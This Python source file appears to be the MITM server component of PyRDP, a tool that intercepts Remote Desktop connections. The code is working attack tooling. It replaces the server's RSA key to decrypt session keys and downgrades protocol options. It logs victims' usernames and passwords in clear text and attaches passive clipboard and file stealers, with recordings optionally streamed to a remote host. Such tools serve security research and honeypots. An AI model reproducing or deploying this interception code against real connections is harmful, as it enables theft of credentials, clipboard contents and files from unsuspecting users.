import datetime
import logging
import os
import random
import socket

from Crypto.PublicKey import RSA
from twisted.internet import reactor

from pyrdp.core import decodeUTF16LE, getLoggerPassFilters
from pyrdp.core.ssl import ServerTLSContext
from pyrdp.enum import CapabilityType, ClientCapabilityFlag, EncryptionLevel, EncryptionMethod, InputEventType, \
    NegotiationProtocols, OrderFlag, ParserMode, PlayerMessageType, SegmentationPDUType, SlowPathDataType, \
    VirtualChannelName
from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, FastPathLayer, Layer, MCSLayer, RawLayer, SecurityLayer, \
    SegmentationLayer, SlowPathLayer, TLSSecurityLayer, TPKTLayer, TwistedTCPLayer, VirtualChannelLayer, X224Layer
from pyrdp.logging import ConnectionMetadataFilter, LOGGER_NAMES, RC4LoggingObserver
from pyrdp.mcs import MCSChannelFactory, MCSServerChannel, MCSUserObserver
from pyrdp.mitm.client import MITMClient
from pyrdp.mitm.factory import MITMClientFactory
from pyrdp.mitm.observer import MITMFastPathObserver, MITMSlowPathObserver
from pyrdp.mitm.router import MITMServerRouter
from pyrdp.mitm.virtual_channel.clipboard import PassiveClipboardStealer
from pyrdp.mitm.virtual_channel.device_redirection import PassiveFileStealerServer
from pyrdp.mitm.virtual_channel.virtual_channel import MITMVirtualChannelObserver
from pyrdp.parser import ClientConnectionParser, ClientInfoParser, createFastPathParser, GCCParser, \
    NegotiationRequestParser, NegotiationResponseParser, ServerConnectionParser
from pyrdp.pdu import Capability, GCCConferenceCreateRequestPDU, GCCConferenceCreateResponsePDU, MCSConnectResponsePDU, \
    NegotiationRequestPDU, NegotiationResponsePDU, ProprietaryCertificate, ServerDataPDU, \
    ServerSecurityData
from pyrdp.recording import FileLayer, Recorder, RecordingFastPathObserver, RecordingSlowPathObserver, SocketLayer
from pyrdp.security import RC4CrypterProxy, SecuritySettings


class MITMServer(MCSUserObserver, MCSChannelFactory):

    def __init__(self, friendlyName: str, targetHost: str, targetPort: int, certificateFileName: str,
                 privateKeyFileName: str, recordHost: str, recordPort: int, replacementUsername: str,
                 replacementPassword: str):
        MCSUserObserver.__init__(self)

        self.sessionId = f"{friendlyName}{random.randrange(100000,999999)}"
        self.log = getLoggerPassFilters(f"{LOGGER_NAMES.MITM_CONNECTIONS}.{self.sessionId}.server")
        self.metadataFilter = ConnectionMetadataFilter(self, self.sessionId)
        self.log.addFilter(self.metadataFilter)

        self.replacementPassword = replacementPassword
        self.replacementUsername = replacementUsername
        self.targetHost = targetHost
        self.targetPort = targetPort
        self.certificateFileName = certificateFileName
        self.privateKeyFileName = privateKeyFileName
        self.clipboardObserver = None
        self.useTLS = False
        self.client: MITMClient = None
        self.clientConnector = None
        self.originalNegotiationPDU = None
        self.targetNegotiationPDU = None
        self.serverData = None
        self.rc4RSAKey = RSA.generate(2048)
        self.crypter = RC4CrypterProxy()
        self.socket = None
        self.fileHandle = open("out/rdp_replay_{}_{}.pyrdp".format(datetime.datetime.now().strftime('%Y%m%d_%H-%M-%S'),
                                                                   random.randint(0, 1000)), "wb")

        rc4Log = getLoggerPassFilters(f"{self.log.name}.rc4")
        self.securitySettings = SecuritySettings(SecuritySettings.Mode.SERVER)
        self.securitySettings.addObserver(self.crypter)
        self.securitySettings.addObserver(RC4LoggingObserver(rc4Log))

        self.tcp = TwistedTCPLayer()
        self.tcp.createObserver(onConnection=self.onConnection, onDisconnection=self.onDisconnection)

        self.segmentation = SegmentationLayer()
        self.segmentation.createObserver(onUnknownHeader=self.onUnknownTPKTHeader)

        self.tpkt = TPKTLayer()

        self.x224 = X224Layer()
        self.x224.createObserver(onConnectionRequest=self.onConnectionRequest,
                                 onDisconnectRequest=self.onDisconnectRequest)

        self.mcs = MCSLayer()
        self.router = MITMServerRouter(self.mcs, self)
        self.mcs.addObserver(self.router)
        self.router.createObserver(
            onConnectionReceived=self.onConnectInitial,
            onDisconnectProviderUltimatum=self.onDisconnectProviderUltimatum,
            onAttachUserRequest=self.onAttachUserRequest,
            onChannelJoinRequest=self.onChannelJoinRequest
        )

        self.gcc = GCCParser()

        self.rdpClientInfoParser = ClientInfoParser()
        self.rdpClientConnectionParser = ClientConnectionParser()
        self.rdpServerConnectionParser = ServerConnectionParser()

        self.securityLayer = None
        self.slowPathLayer = SlowPathLayer()
        self.fastPathLayer = None

        self.tcp.setNext(self.segmentation)
        self.segmentation.attachLayer(SegmentationPDUType.TPKT, self.tpkt)
        Layer.chain(self.tpkt, self.x224, self.mcs)

        if recordHost is not None and recordPort is not None:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                self.socket.connect((recordHost, recordPort))
            except socket.error as e:
                logging.getLogger(LOGGER_NAMES.MITM).error("Could not connect to liveplayer: %(error)s", {"error": e})
                self.socket.close()
                self.socket = None

        recordingLayers = [FileLayer(self.fileHandle)]
        if self.socket is not None:
            recordingLayers.append(SocketLayer(self.socket))

        # Since we're intercepting communications from the original client (so we're a server),
        # We need to write back the packets as if they came from the client.
        self.recorder = Recorder(recordingLayers)

    def getSessionId(self):
        return self.sessionId

    def getProtocol(self):
        return self.tcp

    def getNegotiationPDU(self):
        return self.targetNegotiationPDU

    def connectClient(self):
        # Connect the client side to the target machine
        self.clientConnector = reactor.connectTCP(self.targetHost, self.targetPort, MITMClientFactory(self, self.fileHandle, self.socket, self.replacementUsername, self.replacementPassword))

    def setClient(self, client: MITMClient):
        self.client = client

    def onConnection(self):
        # Connection sequence #0
        clientInfo = self.tcp.transport.client
        self.log.debug("TCP connected from %(arg1)s:%(arg2)s", {"arg1": clientInfo[0], "arg2": clientInfo[1]})

    def onDisconnection(self, reason):
        """
        Record the end of the connection, close everything and delete the replay file if its too
        small (no useful information)
        """
        self.recorder.record(None, PlayerMessageType.CONNECTION_CLOSE)
        self.log.info("Connection closed: %(arg1)s", {"arg1": reason})

        if self.client:
            self.client.disconnect()

        self.disconnectConnector()
        fileSize = self.fileHandle.tell()
        fileName = self.fileHandle.name
        self.fileHandle.close()
        if fileSize < 16:
            try:
                os.remove(fileName)
            except Exception as e:
                logging.getLogger(LOGGER_NAMES.MITM).error("Can't delete small replay file %(replayFile)s: %(error)s",
                                                           {"replayFile": fileName, "error": e})

    def onDisconnectRequest(self, pdu):
        self.log.debug("X224 Disconnect Request received")
        self.disconnect()

    def onDisconnectProviderUltimatum(self, pdu):
        self.log.debug("Disconnect Provider Ultimatum PDU received")
        self.disconnect()

    def disconnect(self):
        self.log.debug("Disconnecting")
        self.disconnectConnector()
        self.tcp.disconnect()
        self.log.removeFilter(self.metadataFilter)
        if self.socket is not None:
            self.socket.close()

    def disconnectConnector(self):
        if self.clientConnector:
            self.clientConnector.disconnect()
            self.clientConnector = None

    def onUnknownTPKTHeader(self, header):
        self.log.error("Closing the connection because an unknown TPKT header was received. Header: 0x%(header)02lx",
                       {"header": header})
        self.disconnect()

    def onConnectionRequest(self, pdu):
        # X224 Request
        self.log.debug("Connection Request received")

        # We need to save the original negotiation PDU because Windows will cut the connection if it
        # sees that the requested protocols have changed.
        parser = NegotiationRequestParser()
        self.originalNegotiationPDU = parser.parse(pdu.payload)

        if self.originalNegotiationPDU.cookie:
            self.log.info("%(cookie)s", {"cookie": self.originalNegotiationPDU.cookie.decode()})
        else:
            self.log.info("No cookie for this connection %(cookie)s", {"cookie": ""})

        # Only SSL is implemented, so remove other protocol flags
        chosenProtocols = self.originalNegotiationPDU.requestedProtocols & NegotiationProtocols.SSL \
            if self.originalNegotiationPDU.requestedProtocols is not None else None
        self.targetNegotiationPDU = NegotiationRequestPDU(
            self.originalNegotiationPDU.cookie,
            self.originalNegotiationPDU.flags,
            chosenProtocols,
            self.originalNegotiationPDU.correlationFlags,
            self.originalNegotiationPDU.correlationID,
            self.originalNegotiationPDU.reserved,
        )

        self.connectClient()

    def onConnectionConfirm(self, _):
        # X224 Response
        protocols = NegotiationProtocols.SSL if self.originalNegotiationPDU.tlsSupported else NegotiationProtocols.NONE

        parser = NegotiationResponseParser()
        payload = parser.write(NegotiationResponsePDU(0x00, protocols))
        self.x224.sendConnectionConfirm(payload, source=0x1234)

        if self.originalNegotiationPDU.tlsSupported:
            self.tcp.startTLS(ServerTLSContext(privateKeyFileName=self.privateKeyFileName,
                                               certificateFileName=self.certificateFileName))
            self.useTLS = True

    def onConnectInitial(self, pdu):
        # MCS Connect Initial
        """
        Parse the ClientData PDU and send a ServerData PDU back.
        :param pdu: The GCC ConferenceCreateResponse PDU that contains the ClientData PDU.
        """
        self.log.debug("Connect Initial received")
        gccConferenceCreateRequestPDU: GCCConferenceCreateRequestPDU = self.gcc.parse(pdu.payload)

        # FIPS is not implemented, so remove this flag if it's set
        rdpClientDataPdu = self.rdpClientConnectionParser.parse(gccConferenceCreateRequestPDU.payload)
        rdpClientDataPdu.securityData.encryptionMethods &= ~EncryptionMethod.ENCRYPTION_FIPS
        rdpClientDataPdu.securityData.extEncryptionMethods &= ~EncryptionMethod.ENCRYPTION_FIPS

        #  This disables the support for the Graphics pipeline extension, which is a completely different way to
        #  transfer graphics from server to client. https://msdn.microsoft.com/en-us/library/dn366933.aspx
        rdpClientDataPdu.coreData.earlyCapabilityFlags &= ~ClientCapabilityFlag.RNS_UD_CS_SUPPORT_DYNVC_GFX_PROTOCOL

        self.client.onConnectInitial(gccConferenceCreateRequestPDU, rdpClientDataPdu)
        return True

    def onConnectResponse(self, pdu, serverData):
        # MCS Connect Response
        """
        :type pdu: MCSConnectResponsePDU
        :type serverData: ServerDataPDU
        """
        if pdu.result != 0:
            self.mcs.send(pdu)
            return

        # Replace the server's public key with our own key so we can decrypt the incoming client random
        cert = serverData.security.serverCertificate
        if cert:
            cert = ProprietaryCertificate(
                cert.signatureAlgorithmID,
                cert.keyAlgorithmID,
                cert.publicKeyType,
                self.rc4RSAKey,
                cert.signatureType,
                cert.signature,
                cert.padding
            )

        security = ServerSecurityData(
            # FIPS is not implemented so avoid using that
            serverData.security.encryptionMethod if serverData.security.encryptionMethod != EncryptionMethod.ENCRYPTION_FIPS else EncryptionMethod.ENCRYPTION_128BIT,
            serverData.security.encryptionLevel if serverData.security.encryptionLevel != EncryptionLevel.ENCRYPTION_LEVEL_FIPS else EncryptionLevel.ENCRYPTION_LEVEL_HIGH,
            serverData.security.serverRandom,
            cert
        )

        serverData.core.clientRequestedProtocols = self.originalNegotiationPDU.requestedProtocols

        self.securitySettings.serverSecurityReceived(security)
        self.serverData = ServerDataPDU(serverData.core, security, serverData.network)

        rdpParser = ServerConnectionParser()
        gccParser = GCCParser()

        gcc = self.client.conferenceCreateResponse
        gcc = GCCConferenceCreateResponsePDU(gcc.nodeID, gcc.tag, gcc.result, rdpParser.write(self.serverData))
        pdu = MCSConnectResponsePDU(pdu.result, pdu.calledConnectID, pdu.domainParams, gccParser.write(gcc))
        self.mcs.send(pdu)

    def onAttachUserRequest(self, _):
        # MCS Attach User Request
        self.client.onAttachUserRequest()

    def onAttachConfirmed(self, user):
        # MCS Attach User Confirm successful
        self.router.sendAttachUserConfirm(True, user.userID)

    def onAttachRefused(self, user, result):
        # MCS Attach User Confirm failed
        self.router.sendAttachUserConfirm(False, result)

    def onChannelJoinRequest(self, pdu):
        # MCS Channel Join Request
        self.client.onChannelJoinRequest(pdu)

    def onChannelJoinAccepted(self, userID, channelID):
        # MCS Channel Join Confirm successful
        self.router.sendChannelJoinConfirm(0, userID, channelID)

    def onChannelJoinRefused(self, user, result, channelID):
        # MCS Channel Join Confirm failed
        self.log.debug("Refusing to connect channelId %(channelId)d", {"channelId": channelID})
        self.router.sendChannelJoinConfirm(result, user.userID, channelID)

    def buildChannel(self, mcs, userID, channelID):
        self.log.debug("building channel %(arg1)s for user %(arg2)d", {"arg1": channelID, "arg2": userID})

        channelMap = self.client.channelMap
        if channelID == self.serverData.network.mcsChannelID:
            return self.buildIOChannel(mcs, userID, channelID)
        elif channelID in channelMap.keys() and channelMap[channelID] == VirtualChannelName.CLIPBOARD:
            return self.buildClipboardChannel(mcs, userID, channelID)
        elif channelID in channelMap.keys() and channelMap[channelID] == VirtualChannelName.DEVICE_REDIRECTION:
            return self.buildDeviceRedirectionChannel(mcs, userID, channelID)
        else:
            return self.buildVirtualChannel(mcs, userID, channelID)

    def createSecurityLayer(self):
        encryptionMethod = self.serverData.security.encryptionMethod

        if self.useTLS:
            return TLSSecurityLayer()
        else:
            return SecurityLayer.create(encryptionMethod, self.crypter)

    def buildVirtualChannel(self, mcs: MCSLayer, userID: int, channelID: int) -> MCSServerChannel:
        channel = MCSServerChannel(mcs, userID, channelID)
        securityLayer = self.createSecurityLayer()
        rawLayer = RawLayer()

        Layer.chain(channel, securityLayer, rawLayer)

        peer = self.client.getChannelObserver(channelID)
        observer = MITMVirtualChannelObserver(rawLayer)
        observer.setPeer(peer)
        rawLayer.addObserver(observer)

        return channel

    def buildClipboardChannel(self, mcs: MCSLayer, userID: int, channelID: int) -> MCSServerChannel:
        """
        :type mcs: MCSLayer
        :param userID: The mcs user that builds the channel
        :param channelID: The channel ID to use to communicate in that channel
        :return: MCSServerChannel that handles the Clipboard virtual channel traffic from the client to the MITM.
        """
        # Create all necessary layers
        channel = MCSServerChannel(mcs, userID, channelID)
        securityLayer = self.createSecurityLayer()
        virtualChannelLayer = VirtualChannelLayer()
        clipboardLayer = ClipboardLayer()

        Layer.chain(channel, securityLayer, virtualChannelLayer, clipboardLayer)

        # Create and link the MITM Observer for the server side to the clipboard layer.
        # Also link both MITM Observers (client and server) so they can send traffic the other way.
        peer = self.client.getChannelObserver(channelID)
        passiveClipboardObserver = PassiveClipboardStealer(clipboardLayer, self.recorder, self.log)
        peer.passiveClipboardObserver = passiveClipboardObserver
        passiveClipboardObserver.setPeer(peer)
        clipboardLayer.addObserver(passiveClipboardObserver)

        return channel

    def buildDeviceRedirectionChannel(self, mcs: MCSLayer, userID: int, channelID: int) -> MCSServerChannel:
        """
        :type mcs: MCSLayer
        :param userID: The mcs user that builds the channel
        :param channelID: The channel ID to use to communicate in that channel
        :return: MCSServerChannel that handles the device redirection virtual channel traffic from
                 the client to the MITM.
        """
        # Create all necessary layers
        channel = MCSServerChannel(mcs, userID, channelID)
        securityLayer = self.createSecurityLayer()
        virtualChannelLayer = VirtualChannelLayer(activateShowProtocolFlag=False)
        deviceRedirectionLayer = DeviceRedirectionLayer()

        Layer.chain(channel, securityLayer, virtualChannelLayer, deviceRedirectionLayer)

        # Create and link the MITM Observer for the server side to the device redirection layer.
        # Also link both MITM Observers (client and server) so they can send traffic the other way.
        peer = self.client.getChannelObserver(channelID)
        observer = PassiveFileStealerServer(deviceRedirectionLayer, self.recorder,
                                            self.client.deviceRedirectionObserver, self.log)
        observer.setPeer(peer)
        deviceRedirectionLayer.addObserver(observer)

        return channel

    def buildIOChannel(self, mcs: MCSLayer, userID: int, channelID: int) -> MCSServerChannel:
        encryptionMethod = self.serverData.security.encryptionMethod
        self.securityLayer = self.createSecurityLayer()
        self.securityLayer.createObserver(
            onClientInfoReceived=self.onClientInfoReceived,
            onSecurityExchangeReceived=self.onSecurityExchangeReceived,
            onLicensingDataReceived=self.onLicensingDataReceived
        )

        slowPathObserver = MITMSlowPathObserver(self.log, self.slowPathLayer, onConfirmActive=self.onConfirmActive)
        slowPathObserver.setDataHandler(SlowPathDataType.PDUTYPE2_INPUT, self.onInputPDUReceived)
        clientObserver = self.client.getChannelObserver(channelID)
        slowPathObserver.setPeer(clientObserver)
        self.slowPathLayer.addObserver(slowPathObserver)
        self.slowPathLayer.addObserver(RecordingSlowPathObserver(self.recorder))

        fastPathParser = createFastPathParser(self.useTLS, encryptionMethod, self.crypter, ParserMode.SERVER)
        self.fastPathLayer = FastPathLayer(fastPathParser)
        fastPathObserver = MITMFastPathObserver(self.log, self.fastPathLayer)
        fastPathObserver.setPeer(self.client.getFastPathObserver())
        self.fastPathLayer.addObserver(fastPathObserver)
        self.fastPathLayer.addObserver(RecordingFastPathObserver(self.recorder, PlayerMessageType.FAST_PATH_INPUT))

        channel = MCSServerChannel(mcs, userID, channelID)
        Layer.chain(channel, self.securityLayer, self.slowPathLayer)

        self.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.fastPathLayer)

        if self.useTLS:
            self.securityLayer.securityHeaderExpected = True

        return channel

    def onConfirmActive(self, pdu):
        # Force RDP server to send bitmap events instead of order events.
        pdu.parsedCapabilitySets[CapabilityType.CAPSTYPE_ORDER].orderFlags = OrderFlag.NEGOTIATEORDERSUPPORT \
                                                                             | OrderFlag.ZEROBOUNDSDELTASSUPPORT
        pdu.parsedCapabilitySets[CapabilityType.CAPSTYPE_ORDER].orderSupport = b"\x00" * 32

        # Disable virtual channel compression
        if CapabilityType.CAPSTYPE_VIRTUALCHANNEL in pdu.parsedCapabilitySets.keys():
            pdu.parsedCapabilitySets[CapabilityType.CAPSTYPE_VIRTUALCHANNEL].flags = 0

        # Override the bitmap cache capability set with null values.
        if CapabilityType.CAPSTYPE_BITMAPCACHE in pdu.parsedCapabilitySets.keys():
            pdu.parsedCapabilitySets[CapabilityType.CAPSTYPE_BITMAPCACHE] =\
                Capability(CapabilityType.CAPSTYPE_BITMAPCACHE, b"\x00" * 36)

    # Security Exchange
    def onSecurityExchangeReceived(self, pdu):
        """
        :type pdu: RDPSecurityExchangePDU
        :return:
        """
        self.log.debug("Security Exchange received")
        clientRandom = self.rc4RSAKey.decrypt(pdu.clientRandom[:: -1])[:: -1]
        self.securitySettings.setClientRandom(clientRandom)

    # Client Info Packet
    def onClientInfoReceived(self, data: bytes):
        """
        Called when client info data is received.
        Record the PDU and send it to the MITMClient.
        """
        pdu = ClientInfoParser().parse(data)

        clientAddress = None
        if pdu.extraInfo:
            clientAddress = decodeUTF16LE(pdu.extraInfo.clientAddress)
        self.log.info("Client address: %(clientAddress)s", {"clientAddress": clientAddress})

        self.log.debug("Client Info received: %(clientInfoPDU)s", {"clientInfoPDU": pdu})
        hasExtraInfo = pdu.extraInfo is not None
        self.log.info("CLIENT INFO RECEIVED.\n"
                      "USER: %(username)s\n"
                      "PASSWORD: %(password)s\n"
                      "DOMAIN: %(domain)s\n"
                      "LOCAL IP ADDR: %(localIpAddress)s",
                      {"username": pdu.username, "password": pdu.password, "domain": pdu.domain,
                       "localIpAddress": pdu.extraInfo.clientAddress if hasExtraInfo else None})
        self.recorder.record(pdu, PlayerMessageType.CLIENT_INFO)
        self.client.onClientInfoPDUReceived(pdu)

    def onLicensingDataReceived(self, data):
        self.log.debug("Sending Licensing data")

        if self.useTLS:
            self.securityLayer.securityHeaderExpected = False

        self.securityLayer.sendLicensing(data)

    def sendDisconnectProviderUltimatum(self, pdu):
        self.mcs.send(pdu)

    def onInputPDUReceived(self, pdu):
        # Unsure if still useful
        for event in pdu.events:
            if event.messageType == InputEventType.INPUT_EVENT_SCANCODE:
                self.log.debug("Key pressed: 0x%2lx" % event.keyCode)
            elif event.messageType == InputEventType.INPUT_EVENT_MOUSE:
                self.log.debug("Mouse position: x = %d, y = %d" % (event.x, event.y))
